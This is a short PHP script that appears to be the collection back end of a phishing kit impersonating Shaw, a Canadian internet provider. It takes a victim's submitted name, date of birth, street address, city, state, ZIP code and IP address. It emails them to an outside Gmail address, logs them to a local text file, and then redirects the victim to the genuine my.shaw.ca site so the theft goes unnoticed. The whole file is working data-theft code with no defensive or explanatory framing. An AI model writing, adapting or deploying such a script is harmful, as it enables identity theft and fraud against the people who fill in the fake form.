<?php
$required = array('addre');

$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
}

if ($error) {
  echo '404';
} else {
session_start();

$ip = getenv("REMOTE_ADDR");

$msg = "

NAME : ".$_POST['fullname']."
DOB : ".$_POST['dateee']."
ADDRESS : ".$_POST['addre']."
CITY : ".$_POST['city']."
STATE : ".$_POST['state']."
ZIP : ".$_POST['zipc']."
IP : $ip
==================================";

$send = "dosta@gmail.com";
$subj = "♥ Shaw INF ♥ - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail($send, $subj, $msg, $headers);


$fp=fopen('sub.txt','a'); 
fwrite($fp,addslashes($msg). "\r\n"); 
fclose($fp); 
header("Location: https://my.shaw.ca");
exit();
}
?>